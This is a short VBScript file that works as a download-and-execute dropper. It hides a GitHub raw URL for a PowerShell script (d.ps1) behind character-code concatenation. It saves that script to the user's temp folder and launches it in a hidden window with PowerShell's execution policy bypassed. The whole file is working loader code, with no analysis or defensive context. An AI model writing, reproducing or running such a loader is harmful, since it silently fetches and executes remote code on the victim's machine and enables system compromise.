Dim a, b, c, d, e, f

Set a = CreateObject("Scripting.FileSystemObject")
Set b = CreateObject("WScript.Shell")

e = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(115) & Chr(58) & Chr(47) & Chr(47) & Chr(114) & Chr(97) & Chr(119) & Chr(46) & Chr(103) & Chr(105) & Chr(116) & Chr(104) & Chr(117) & Chr(98) & Chr(117) & Chr(115) & Chr(101) & Chr(114) & Chr(99) & Chr(111) & Chr(110) & Chr(116) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47) & Chr(119) & Chr(97) & Chr(103) & Chr(110) & Chr(101) & Chr(114) & Chr(48) & Chr(49) & Chr(50) & Chr(47) & Chr(119) & Chr(97) & Chr(103) & Chr(110) & Chr(101) & Chr(114) & Chr(47) & Chr(114) & Chr(101) & Chr(102) & Chr(115) & Chr(47) & Chr(104) & Chr(101) & Chr(97) & Chr(100) & Chr(115) & Chr(47) & Chr(109) & Chr(97) & Chr(105) & Chr(110) & Chr(47) & Chr(100) & Chr(46) & Chr(112) & Chr(115) & Chr(49)

' Define the path to the temp PowerShell script
f = b.ExpandEnvironmentStrings("%TEMP%") & "\temp_script.ps1"

With CreateObject("MSXML2.XMLHTTP")
    .Open "GET", e, False
    .Send
    If .Status = 200 Then
        Set d = a.CreateTextFile(f, True)
        d.Write .ResponseText
        d.Close
    End If
End With

b.Run "powershell -NoProfile -ExecutionPolicy Bypass -File """ & f & """", 0, False
